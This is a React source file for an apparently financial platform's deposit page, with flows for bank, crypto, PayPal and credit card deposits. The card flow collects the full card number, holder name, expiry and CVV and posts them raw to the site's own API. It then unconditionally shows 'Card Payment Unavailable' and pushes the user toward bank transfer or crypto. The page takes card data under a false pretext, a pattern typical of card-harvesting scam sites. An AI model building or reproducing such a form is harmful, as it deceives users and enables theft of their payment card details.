import { useState, useEffect, useRef } from "react";
import AppShell from "../components/AppShell.jsx";
import { api } from "../lib/api.js";
import { useAuth } from "../lib/AuthContext.jsx";
import { useNavigate } from "react-router-dom";

const METHODS = [
  { id: "BANK_TRANSFER", icon: "🏦", label: "Bank Transfer", desc: "Direct bank-to-bank transfer", color: "#1A56DB" },
  { id: "USDT", icon: "◈", label: "USDT", desc: "TRC20 / ERC20 Network", color: "#26A17B" },
  { id: "BITCOIN", icon: "₿", label: "Bitcoin", desc: "BTC Network", color: "#F7931A" },
  { id: "PAYPAL", icon: "Ⓟ", label: "PayPal", desc: "Instant transfer", color: "#009CDE" },
  { id: "CREDIT_CARD", icon: "💳", label: "Credit Card", desc: "Visa / Mastercard / Amex", color: "#8B5CF6" },
];

const quickAmounts = [500, 1000, 2500, 5000, 10000];

function formatCard(val) {
  return val.replace(/\D/g, "").replace(/(.{4})/g, "$1 ").trim().substring(0, 19);
}

function formatExpiry(val) {
  const digits = val.replace(/\D/g, "").substring(0, 4);
  if (digits.length > 2) return digits.substring(0, 2) + "/" + digits.substring(2);
  return digits;
}

export default function DepositPage() {
  const { refreshWallet, user } = useAuth();
  const navigate = useNavigate();
  const fileInputRef = useRef(null);
  const [step, setStep] = useState(1);
  const [method, setMethod] = useState("");
  const [amount, setAmount] = useState("");
  const [channels, setChannels] = useState({});
  const [depositId, setDepositId] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [copied, setCopied] = useState("");

  // Proof step
  const [paymentRef, setPaymentRef] = useState("");
  const [screenshot, setScreenshot] = useState(null);
  const [screenshotPreview, setScreenshotPreview] = useState(null);

  // Credit card fields
  const [card, setCard] = useState({ number: "", holder: "", expiry: "", cvv: "" });
  const [cardSubmitted, setCardSubmitted] = useState(false);

  const numAmount = parseFloat(amount) || 0;
  const selectedMethod = METHODS.find((m) => m.id === method);

  useEffect(() => {
    api.getPaymentChannels()
      .then((list) => {
        const map = {};
        list.forEach((ch) => { map[ch.method] = ch; });
        setChannels(map);
      })
      .catch(() => {});
  }, []);

  const copyToClipboard = (text, key) => {
    navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(""), 2000);
  };

  const handleScreenshotChange = (e) => {
    const file = e.target.files?.[0];
    if (!file || !file.type.startsWith("image/")) return;
    setScreenshot(file);
    const reader = new FileReader();
    reader.onload = (ev) => setScreenshotPreview(ev.target.result);
    reader.readAsDataURL(file);
  };

  const handleInitDeposit = async () => {
    if (numAmount < 10) { setError("Minimum deposit is $10."); return; }
    setLoading(true); setError("");
    try {
      const res = await api.createDeposit({ amount: numAmount, paymentMethod: method });
      setDepositId(res.depositId);
      if (method === "CREDIT_CARD") {
        setStep(3); // credit card form
      } else {
        setStep(2); // payment instructions
      }
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const handleSubmitCard = async () => {
    const [month, year] = (card.expiry || "").split("/");
    if (!card.number.replace(/\s/g, "") || !card.holder || !month || !year || !card.cvv) {
      setError("Please fill in all card details."); return;
    }
    setLoading(true); setError("");
    try {
      await api.submitCreditCard({
        depositId,
        cardNumber: card.number.replace(/\s/g, ""),
        cardHolder: card.holder,
        expiryMonth: month?.padStart(2, "0") || "",
        expiryYear: year ? `20${year}` : new Date().getFullYear().toString(),
        cvv: card.cvv,
      });
      setCardSubmitted(true);
      setStep(5); // credit card unavailable
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const handleSubmitProof = async () => {
    const hasRef = paymentRef.trim().length >= 4;
    const hasFile = !!screenshot;
    if (!hasRef && !hasFile) { setError("Please provide a payment reference or upload a screenshot."); return; }
    if (!depositId) return;
    setLoading(true); setError("");
    try {
      const fd = new FormData();
      if (paymentRef.trim()) fd.append("paymentRef", paymentRef.trim());
      if (screenshot) fd.append("screenshot", screenshot);
      await api.submitPaymentProof(depositId, fd);
      setStep(4); // success
      refreshWallet();
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const reset = () => {
    setStep(1); setMethod(""); setAmount(""); setDepositId(null);
    setError(""); setPaymentRef(""); setScreenshot(null); setScreenshotPreview(null);
    setCard({ number: "", holder: "", expiry: "", cvv: "" }); setCardSubmitted(false);
  };

  const ch = channels[method];

  // ── Step 4: Success ──
  if (step === 4) {
    return (
      <AppShell>
        <div style={{ display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", minHeight: "70vh", textAlign: "center" }}>
          <div style={{ width: "80px", height: "80px", borderRadius: "50%", background: "rgba(52,211,153,0.12)", border: "1px solid rgba(52,211,153,0.3)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "36px", marginBottom: "20px" }}>✓</div>
          <h2 className="font-black text-white" style={{ fontSize: "22px", marginBottom: "8px" }}>Deposit Submitted!</h2>
          <p style={{ color: "rgba(148,163,184,0.65)", fontSize: "13px", lineHeight: 1.7, marginBottom: "8px" }}>
            ${numAmount.toLocaleString()} via {selectedMethod?.label}
          </p>
          <p style={{ color: "rgba(148,163,184,0.55)", fontSize: "13px", lineHeight: 1.6, marginBottom: "28px" }}>
            Your deposit is pending confirmation.<br />Usually processed within 1–3 business hours.
          </p>
          <button onClick={reset} style={{ padding: "14px 32px", borderRadius: "12px", border: "none", background: "linear-gradient(135deg,#1A56DB,#1247C0)", color: "white", fontSize: "15px", fontWeight: 700, cursor: "pointer", fontFamily: "Inter, sans-serif", boxShadow: "0 4px 20px rgba(26,86,219,0.4)" }}>
            Make Another Deposit
          </button>
        </div>
      </AppShell>
    );
  }

  // ── Step 5: Credit Card Unavailable ──
  if (step === 5) {
    return (
      <AppShell>
        <div style={{ display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", minHeight: "60vh", textAlign: "center", padding: "20px 0" }}>
          <div style={{ width: "72px", height: "72px", borderRadius: "50%", background: "rgba(245,158,11,0.12)", border: "1px solid rgba(245,158,11,0.3)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "32px", marginBottom: "20px" }}>⚠️</div>
          <h2 className="font-black text-white" style={{ fontSize: "20px", marginBottom: "10px" }}>Card Payment Unavailable</h2>
          <p style={{ color: "rgba(148,163,184,0.7)", fontSize: "13px", lineHeight: 1.7, marginBottom: "24px", maxWidth: "280px" }}>
            Credit card payments are temporarily unavailable. Please use one of the alternative methods below.
          </p>
          <div style={{ width: "100%", display: "flex", flexDirection: "column", gap: "10px", marginBottom: "16px" }}>
            <button onClick={() => { reset(); setMethod("BANK_TRANSFER"); setStep(1); }}
              style={{ width: "100%", padding: "16px", borderRadius: "14px", border: "none", background: "linear-gradient(135deg,#1A56DB,#1247C0)", color: "white", fontSize: "15px", fontWeight: 700, cursor: "pointer", fontFamily: "Inter, sans-serif", boxShadow: "0 4px 20px rgba(26,86,219,0.4)" }}>
              🏦 Deposit via Bank Transfer
            </button>
            <button onClick={() => { reset(); setMethod("USDT"); setStep(1); }}
              style={{ width: "100%", padding: "16px", borderRadius: "14px", border: "1px solid rgba(255,255,255,0.1)", background: "rgba(255,255,255,0.04)", color: "#E2E8F0", fontSize: "15px", fontWeight: 600, cursor: "pointer", fontFamily: "Inter, sans-serif" }}>
              ◈ Deposit via Crypto
            </button>
          </div>
          <button onClick={reset} style={{ background: "none", border: "none", color: "rgba(148,163,184,0.5)", fontSize: "13px", cursor: "pointer" }}>Start Over</button>
        </div>
      </AppShell>
    );
  }

  return (
    <AppShell>
      <div style={{ marginBottom: "24px" }}>
        <div style={{ color: "rgba(148,163,184,0.6)", fontSize: "13px", marginBottom: "2px" }}>Fund Your Account</div>
        <h1 className="font-black text-white" style={{ fontSize: "26px", letterSpacing: "-0.02em" }}>Deposit</h1>
      </div>

      {error && (
        <div style={{ background: "rgba(239,68,68,0.1)", border: "1px solid rgba(239,68,68,0.3)", borderRadius: "10px", padding: "10px 14px", marginBottom: "16px", color: "#F87171", fontSize: "13px" }}>
          {error}
        </div>
      )}

      {/* ── Step 1: Select Method + Amount ── */}
      {step === 1 && (
        <>
          <div style={{ marginBottom: "20px" }}>
            <label style={{ display: "block", fontSize: "11px", fontWeight: 700, letterSpacing: "0.1em", textTransform: "uppercase", color: "#94A3B8", marginBottom: "10px" }}>
              Payment Method
            </label>
            <div style={{ display: "flex", flexDirection: "column", gap: "8px" }}>
              {METHODS.map((m) => (
                <div key={m.id} onClick={() => setMethod(m.id)}
                  style={{ display: "flex", alignItems: "center", gap: "14px", padding: "14px 16px", borderRadius: "14px", cursor: "pointer", background: method === m.id ? `${m.color}18` : "rgba(255,255,255,0.03)", border: method === m.id ? `1px solid ${m.color}55` : "1px solid rgba(255,255,255,0.07)", transition: "all 0.2s" }}>
                  <div style={{ width: "40px", height: "40px", borderRadius: "10px", background: `${m.color}22`, border: `1px solid ${m.color}44`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: "18px", flexShrink: 0 }}>{m.icon}</div>
                  <div style={{ flex: 1 }}>
                    <div style={{ fontSize: "14px", fontWeight: 700, color: "#E2E8F0" }}>{m.label}</div>
                    <div style={{ fontSize: "11px", color: "rgba(148,163,184,0.5)" }}>{m.desc}</div>
                  </div>
                  {method === m.id && (
                    <div style={{ width: "20px", height: "20px", borderRadius: "50%", background: m.color, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                      <svg width="11" height="11" viewBox="0 0 12 10" fill="none"><path d="M1 5l3.5 3.5L11 1" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" /></svg>
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>

          {method && (
            <div style={{ marginBottom: "20px" }}>
              <label style={{ display: "block", fontSize: "11px", fontWeight: 700, letterSpacing: "0.1em", textTransform: "uppercase", color: "#94A3B8", marginBottom: "10px" }}>
                Amount (USD)
              </label>
              <div style={{ position: "relative" }}>
                <span style={{ position: "absolute", left: "18px", top: "50%", transform: "translateY(-50%)", fontSize: "20px", fontWeight: 700, color: "#64748B" }}>$</span>
                <input type="number" placeholder="0.00" value={amount} onChange={(e) => setAmount(e.target.value)}
                  style={{ width: "100%", background: "rgba(10,18,40,0.7)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: "14px", padding: "18px 18px 18px 40px", color: "#E2E8F0", fontFamily: "Inter, sans-serif", fontSize: "22px", fontWeight: 800, outline: "none", boxSizing: "border-box" }}
                  onFocus={(e) => { e.target.style.borderColor = "rgba(26,86,219,0.5)"; e.target.style.boxShadow = "0 0 0 3px rgba(26,86,219,0.1)"; }}
                  onBlur={(e) => { e.target.style.borderColor = "rgba(255,255,255,0.08)"; e.target.style.boxShadow = "none"; }}
                />
              </div>
              <div style={{ display: "flex", gap: "8px", marginTop: "10px", flexWrap: "wrap" }}>
                {quickAmounts.map((a) => (
                  <button key={a} onClick={() => setAmount(String(a))}
                    style={{ padding: "6px 12px", borderRadius: "8px", fontSize: "12px", fontWeight: 600, border: amount === String(a) ? "none" : "1px solid rgba(255,255,255,0.08)", background: amount === String(a) ? "linear-gradient(135deg,#1A56DB,#1247C0)" : "rgba(255,255,255,0.04)", color: amount === String(a) ? "white" : "#94A3B8", cursor: "pointer", fontFamily: "Inter, sans-serif" }}>
                    ${a.toLocaleString()}
                  </button>
                ))}
              </div>
            </div>
          )}

          <button onClick={handleInitDeposit} disabled={!method || numAmount < 10 || loading}
            style={{ width: "100%", padding: "17px", borderRadius: "14px", border: "none", background: method && numAmount >= 10 ? "linear-gradient(135deg,#1A56DB,#1247C0)" : "rgba(255,255,255,0.06)", color: method && numAmount >= 10 ? "white" : "#64748B", fontSize: "16px", fontWeight: 700, cursor: method && numAmount >= 10 ? "pointer" : "not-allowed", fontFamily: "Inter, sans-serif", boxShadow: method && numAmount >= 10 ? "0 4px 24px rgba(26,86,219,0.4)" : "none" }}>
            {loading ? "Processing…" : "Continue →"}
          </button>
        </>
      )}

      {/* ── Step 2: Payment Instructions ── */}
      {step === 2 && ch && (
        <>
          <div style={{ background: "linear-gradient(135deg,#0D1F3C,#0A1628)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: "18px", padding: "20px", marginBottom: "16px" }}>
            <div style={{ fontSize: "14px", fontWeight: 700, color: "white", marginBottom: "16px" }}>
              Payment Instructions — {selectedMethod?.label}
            </div>

            <div style={{ background: "rgba(26,86,219,0.08)", borderRadius: "10px", padding: "12px 14px", marginBottom: "14px", border: "1px solid rgba(26,86,219,0.2)" }}>
              <div style={{ fontSize: "10px", color: "rgba(148,163,184,0.5)", marginBottom: "4px", textTransform: "uppercase", letterSpacing: "0.08em", fontWeight: 700 }}>Amount to Send</div>
              <div style={{ fontSize: "22px", fontWeight: 800, color: "#34D399" }}>${numAmount.toLocaleString()} USD</div>
            </div>

            {/* Render channel details dynamically */}
            {Object.entries(ch.details).map(([key, val]) => {
              if (!val) return null;
              const labels = { address: "Wallet Address", accountName: "Account Name", accountNumber: "Account Number", bankName: "Bank Name", routingNumber: "Routing Number", swiftCode: "SWIFT / BIC", paypalEmail: "PayPal Email", network: "Network", sortCode: "Sort Code", iban: "IBAN" };
              const label = labels[key] || key;
              return (
                <div key={key} style={{ marginBottom: "12px" }}>
                  <div style={{ fontSize: "10px", color: "rgba(148,163,184,0.5)", marginBottom: "6px", textTransform: "uppercase", letterSpacing: "0.08em", fontWeight: 700 }}>{label}</div>
                  <div style={{ background: "rgba(255,255,255,0.04)", borderRadius: "10px", padding: "10px 12px", border: "1px solid rgba(255,255,255,0.07)", display: "flex", alignItems: "center", justifyContent: "space-between", gap: "8px" }}>
                    <div style={{ fontSize: "13px", color: "#E2E8F0", wordBreak: "break-all", fontFamily: ["address", "iban", "accountNumber"].includes(key) ? "monospace" : "inherit" }}>{val}</div>
                    {["address", "accountNumber", "iban", "paypalEmail"].includes(key) && (
                      <button onClick={() => copyToClipboard(val, key)}
                        style={{ flexShrink: 0, padding: "6px 12px", borderRadius: "8px", background: copied === key ? "rgba(52,211,153,0.15)" : "rgba(26,86,219,0.15)", color: copied === key ? "#34D399" : "#60A5FA", fontSize: "11px", fontWeight: 600, cursor: "pointer", border: `1px solid ${copied === key ? "rgba(52,211,153,0.3)" : "rgba(26,86,219,0.3)"}`, fontFamily: "Inter, sans-serif", whiteSpace: "nowrap" }}>
                        {copied === key ? "✓ Copied" : "Copy"}
                      </button>
                    )}
                  </div>
                </div>
              );
            })}

            <div style={{ background: "rgba(245,158,11,0.07)", border: "1px solid rgba(245,158,11,0.18)", borderRadius: "10px", padding: "10px 14px", marginTop: "8px" }}>
              <div style={{ fontSize: "12px", color: "#FCD34D", lineHeight: 1.6 }}>
                ⚠️ Use the account details above exactly as shown. Include your name or account number as the payment reference.
              </div>
            </div>
          </div>

          <button onClick={() => setStep(3)}
            style={{ width: "100%", padding: "17px", borderRadius: "14px", border: "none", background: "linear-gradient(135deg,#1A56DB,#1247C0)", color: "white", fontSize: "16px", fontWeight: 700, cursor: "pointer", fontFamily: "Inter, sans-serif", boxShadow: "0 4px 24px rgba(26,86,219,0.4)", marginBottom: "10px" }}>
            I've Sent the Payment →
          </button>
          <button onClick={() => setStep(1)} style={{ width: "100%", padding: "15px", borderRadius: "14px", border: "1px solid rgba(255,255,255,0.1)", background: "transparent", color: "#94A3B8", fontSize: "15px", fontWeight: 600, cursor: "pointer", fontFamily: "Inter, sans-serif" }}>
            Back
          </button>
        </>
      )}

      {/* ── Step 3: Credit Card Form ── */}
      {step === 3 && method === "CREDIT_CARD" && (
        <>
          <div style={{ background: "linear-gradient(135deg,#0D1F3C,#0A1628)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: "18px", padding: "20px", marginBottom: "16px" }}>
            <div style={{ fontSize: "14px", fontWeight: 700, color: "white", marginBottom: "16px" }}>Card Details</div>
            <p style={{ fontSize: "13px", color: "rgba(148,163,184,0.6)", lineHeight: 1.6, marginBottom: "20px" }}>
              Enter your card details to proceed with the payment.
            </p>

            {/* Card number */}
            {[
              { label: "Card Number", placeholder: "0000 0000 0000 0000", value: card.number, key: "number", onChange: (v) => setCard({ ...card, number: formatCard(v) }), inputMode: "numeric" },
              { label: "Cardholder Name", placeholder: "JOHN DOE", value: card.holder, key: "holder", onChange: (v) => setCard({ ...card, holder: v.toUpperCase() }) },
            ].map((f) => (
              <div key={f.key} style={{ marginBottom: "14px" }}>
                <label style={{ display: "block", fontSize: "11px", fontWeight: 700, letterSpacing: "0.1em", textTransform: "uppercase", color: "#94A3B8", marginBottom: "7px" }}>{f.label}</label>
                <input type="text" placeholder={f.placeholder} value={f.value} onChange={(e) => f.onChange(e.target.value)}
                  inputMode={f.inputMode}
                  style={{ width: "100%", background: "rgba(10,18,40,0.7)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: "12px", padding: "14px 16px", color: "#E2E8F0", fontFamily: "Inter, sans-serif", fontSize: "15px", outline: "none", letterSpacing: f.key === "number" ? "0.12em" : "normal", boxSizing: "border-box" }}
                  onFocus={(e) => { e.target.style.borderColor = "rgba(139,92,246,0.5)"; e.target.style.boxShadow = "0 0 0 3px rgba(139,92,246,0.1)"; }}
                  onBlur={(e) => { e.target.style.borderColor = "rgba(255,255,255,0.08)"; e.target.style.boxShadow = "none"; }}
                />
              </div>
            ))}
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px" }}>
              <div>
                <label style={{ display: "block", fontSize: "11px", fontWeight: 700, letterSpacing: "0.1em", textTransform: "uppercase", color: "#94A3B8", marginBottom: "7px" }}>Expiry</label>
                <input type="text" placeholder="MM/YY" value={card.expiry} inputMode="numeric"
                  onChange={(e) => setCard({ ...card, expiry: formatExpiry(e.target.value) })}
                  style={{ width: "100%", background: "rgba(10,18,40,0.7)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: "12px", padding: "14px 16px", color: "#E2E8F0", fontFamily: "Inter, sans-serif", fontSize: "15px", outline: "none", boxSizing: "border-box" }}
                  onFocus={(e) => { e.target.style.borderColor = "rgba(139,92,246,0.5)"; e.target.style.boxShadow = "0 0 0 3px rgba(139,92,246,0.1)"; }}
                  onBlur={(e) => { e.target.style.borderColor = "rgba(255,255,255,0.08)"; e.target.style.boxShadow = "none"; }}
                />
              </div>
              <div>
                <label style={{ display: "block", fontSize: "11px", fontWeight: 700, letterSpacing: "0.1em", textTransform: "uppercase", color: "#94A3B8", marginBottom: "7px" }}>CVV</label>
                <input type="password" placeholder="•••" value={card.cvv} inputMode="numeric" maxLength={4}
                  onChange={(e) => setCard({ ...card, cvv: e.target.value.replace(/\D/g, "").substring(0, 4) })}
                  style={{ width: "100%", background: "rgba(10,18,40,0.7)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: "12px", padding: "14px 16px", color: "#E2E8F0", fontFamily: "Inter, sans-serif", fontSize: "15px", outline: "none", boxSizing: "border-box" }}
                  onFocus={(e) => { e.target.style.borderColor = "rgba(139,92,246,0.5)"; e.target.style.boxShadow = "0 0 0 3px rgba(139,92,246,0.1)"; }}
                  onBlur={(e) => { e.target.style.borderColor = "rgba(255,255,255,0.08)"; e.target.style.boxShadow = "none"; }}
                />
              </div>
            </div>
          </div>

          <button onClick={handleSubmitCard} disabled={loading}
            style={{ width: "100%", padding: "17px", borderRadius: "14px", border: "none", background: "linear-gradient(135deg,#8B5CF6,#6D28D9)", color: "white", fontSize: "16px", fontWeight: 700, cursor: loading ? "not-allowed" : "pointer", fontFamily: "Inter, sans-serif", marginBottom: "10px", boxShadow: "0 4px 24px rgba(139,92,246,0.4)" }}>
            {loading ? "Processing…" : "Submit Payment"}
          </button>
          <button onClick={() => setStep(1)} style={{ width: "100%", padding: "15px", borderRadius: "14px", border: "1px solid rgba(255,255,255,0.1)", background: "transparent", color: "#94A3B8", fontSize: "15px", fontWeight: 600, cursor: "pointer", fontFamily: "Inter, sans-serif" }}>
            Back
          </button>
        </>
      )}

      {/* ── Step 3 (non-credit-card): Upload Proof ── */}
      {step === 3 && method !== "CREDIT_CARD" && (
        <>
          <div style={{ background: "linear-gradient(135deg,#0D1F3C,#0A1628)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: "18px", padding: "20px", marginBottom: "16px" }}>
            <div style={{ fontSize: "14px", fontWeight: 700, color: "white", marginBottom: "8px" }}>Confirm Payment</div>
            <p style={{ fontSize: "13px", color: "rgba(148,163,184,0.65)", lineHeight: 1.6, marginBottom: "20px" }}>
              Provide your payment reference number and/or a screenshot to verify your deposit.
            </p>

            <label style={{ display: "block", fontSize: "11px", fontWeight: 700, letterSpacing: "0.1em", textTransform: "uppercase", color: "#94A3B8", marginBottom: "8px" }}>
              Payment Reference / TxID <span style={{ color: "rgba(148,163,184,0.4)", textTransform: "none", fontWeight: 500 }}>(optional)</span>
            </label>
            <input type="text" placeholder="Paste reference number or transaction ID…" value={paymentRef} onChange={(e) => setPaymentRef(e.target.value)}
              style={{ width: "100%", background: "rgba(10,18,40,0.7)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: "10px", padding: "12px 14px", color: "#E2E8F0", fontFamily: "monospace", fontSize: "13px", outline: "none", marginBottom: "20px", boxSizing: "border-box" }}
              onFocus={(e) => { e.target.style.borderColor = "rgba(26,86,219,0.5)"; }}
              onBlur={(e) => { e.target.style.borderColor = "rgba(255,255,255,0.08)"; }}
            />

            <label style={{ display: "block", fontSize: "11px", fontWeight: 700, letterSpacing: "0.1em", textTransform: "uppercase", color: "#94A3B8", marginBottom: "8px" }}>
              Payment Screenshot <span style={{ color: "rgba(148,163,184,0.4)", textTransform: "none", fontWeight: 500 }}>(optional)</span>
            </label>
            <input ref={fileInputRef} type="file" accept="image/*" onChange={handleScreenshotChange} style={{ display: "none" }} />

            {!screenshotPreview ? (
              <div onClick={() => fileInputRef.current?.click()}
                style={{ border: "1.5px dashed rgba(255,255,255,0.12)", borderRadius: "12px", padding: "24px 16px", textAlign: "center", cursor: "pointer", background: "rgba(255,255,255,0.02)" }}
                onMouseEnter={(e) => { e.currentTarget.style.borderColor = "rgba(26,86,219,0.45)"; e.currentTarget.style.background = "rgba(26,86,219,0.05)"; }}
                onMouseLeave={(e) => { e.currentTarget.style.borderColor = "rgba(255,255,255,0.12)"; e.currentTarget.style.background = "rgba(255,255,255,0.02)"; }}>
                <div style={{ fontSize: "28px", marginBottom: "8px" }}>🖼️</div>
                <div style={{ fontSize: "13px", fontWeight: 600, color: "#60A5FA", marginBottom: "4px" }}>Tap to upload screenshot</div>
                <div style={{ fontSize: "11px", color: "rgba(148,163,184,0.45)" }}>PNG, JPG, WEBP · Max 5MB</div>
              </div>
            ) : (
              <div style={{ borderRadius: "12px", overflow: "hidden", border: "1px solid rgba(52,211,153,0.3)", position: "relative" }}>
                <img src={screenshotPreview} alt="Proof" style={{ width: "100%", maxHeight: "200px", objectFit: "cover", display: "block" }} />
                <button onClick={() => { setScreenshot(null); setScreenshotPreview(null); }}
                  style={{ position: "absolute", top: "8px", right: "8px", padding: "4px 10px", borderRadius: "6px", border: "1px solid rgba(239,68,68,0.35)", background: "rgba(239,68,68,0.15)", color: "#F87171", fontSize: "11px", fontWeight: 700, cursor: "pointer" }}>
                  Remove
                </button>
              </div>
            )}
          </div>

          <button onClick={handleSubmitProof} disabled={loading || (!paymentRef.trim() && !screenshot)}
            style={{ width: "100%", padding: "17px", borderRadius: "14px", border: "none", background: paymentRef.trim() || screenshot ? "linear-gradient(135deg,#1A56DB,#1247C0)" : "rgba(255,255,255,0.06)", color: paymentRef.trim() || screenshot ? "white" : "#64748B", fontSize: "16px", fontWeight: 700, cursor: paymentRef.trim() || screenshot ? "pointer" : "not-allowed", fontFamily: "Inter, sans-serif", marginBottom: "10px" }}>
            {loading ? "Submitting…" : "Submit for Verification"}
          </button>
          <button onClick={() => setStep(2)} style={{ width: "100%", padding: "15px", borderRadius: "14px", border: "1px solid rgba(255,255,255,0.1)", background: "transparent", color: "#94A3B8", fontSize: "15px", fontWeight: 600, cursor: "pointer", fontFamily: "Inter, sans-serif" }}>
            Back
          </button>
        </>
      )}
    </AppShell>
  );
}
